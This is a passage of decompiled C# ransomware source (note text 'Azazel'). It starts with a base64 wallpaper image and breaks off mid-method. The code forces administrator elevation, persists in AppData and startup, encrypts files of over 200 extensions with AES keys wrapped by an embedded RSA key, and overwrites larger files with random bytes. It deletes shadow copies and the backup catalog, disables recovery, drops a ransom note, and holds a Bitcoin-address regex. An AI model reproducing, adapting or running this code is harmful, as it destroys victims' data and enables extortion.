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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[1] { "Azazel" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152L)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000L)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>yBK0a5GbQyVZeGVjUfarcIUGmzr5NO//wa9ZZBozxjeiNLZxL6e6yrnhOFkqlvJw76f9vMF4Ax9MK3McBYKArWYvupcX+dinKgvVbXjdGKmX0Xp+rFJMT6izr7tDO4jyAdT6y1I95hpzIG7uyirmqbMckQXgJOT0K1vvwrMyfnk=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
